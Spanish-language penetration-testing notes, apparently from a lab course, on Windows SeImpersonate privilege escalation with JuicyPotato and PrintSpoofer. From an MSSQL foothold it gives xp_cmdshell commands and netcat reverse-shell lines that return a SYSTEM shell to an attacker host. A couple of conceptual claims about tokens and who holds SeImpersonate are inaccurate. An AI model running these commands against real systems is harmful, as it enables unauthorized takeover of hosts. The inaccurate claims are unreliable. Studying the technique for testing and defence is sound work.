
En Windows cada proceso que se ejecuta va con un token que contiene  informacion sobre la cuenta que lo esta ejecutando

Los tokens no se consideran seguros porque se almacenan en memoria y podrian ser suceptibles a fuerza bruta por usuarios que no puedan leerla

El privilegios SeImpersonte permite usar tokens y se otorga solo a cuentas administrativas

Hay programas que usan este privilegio para escalar a Administrator y poder ejecutarse

Los ataques de estilo Potato se caracterizan por engañar a un proceso que usa SYSTEM para que se contecte a nuestro proceso al cual nos entrega el token para que lo use nuestro proceso


## Ejemplo de SeImpersonate - JuicyPotato

Hemos obtenido acceso inicial a un servidor SQL usando un usuario SQL privilegiado. Las conexiones IIS y SQL Server pueden estar configuradas para usar autenticacion Windows y es posible que el usuario que se loguea necesite acceder a sus recursos. Este se consigue suplantando el usuario que inicia sesion y necesita SeImpersonate

La cuenta de servicio es `mssqlserver`, imagina que con ella conseguimos xp_cmdshell y conseguimos en el archivo `logins.sql` las siguientes credenciales usando Snaffler:

- `sql_dev:Str0ng_P@ssw0rd!`

Nos conectamos al servidor y verificamos nuestros privs:

```
impacket-msqlclient USER@IP -windows-auth
>enable_xp_cmdshell
>xp_cmdshell whoami
>xp_cmdshell whoami /priv
```

Verificamos que tenemos los privilegios de SeImpersonte y SeAssignPrimaryToken


#### Escalando privs con JuicyPotato

[JuicyPotato](https://github.com/ohpe/juicy-potato): para abajo de Windows Server 2019 y Windows 10

```
nc -nvlp 8443
```

```
xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe IP_KALI 8443 -e cmd.exe" -t *
```
![[Pasted image 20260817155044.png]]

![[Pasted image 20260817155052.png]]


JuicyPotato intenta todos los procesos de creacion de proceso para usar el token obtenido, usa el puerto -l 53375 para realizar la impersonacion y crear un cmd y tras esto ejecuta dentro de ese cmd netcat para comunicarse con nuestro listener y enviarnos un cmd a nuestro puerto


## PrintSpoofer y RoguePotato

[PrintSpoofer](https://github.com/itm4n/PrintSpoofer) y [RoguePotato](https://github.com/antonioCoco/RoguePotato): para Windows Server 2019 y Windows 10

#### Escalando privilegios con PrintSpoofer

```
nc -lnvp 8443
```

```
xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
```
![[Pasted image 20260817155756.png]]

Con PrintSpoofer generamos un proceso que se ejecuta como SYSTEM
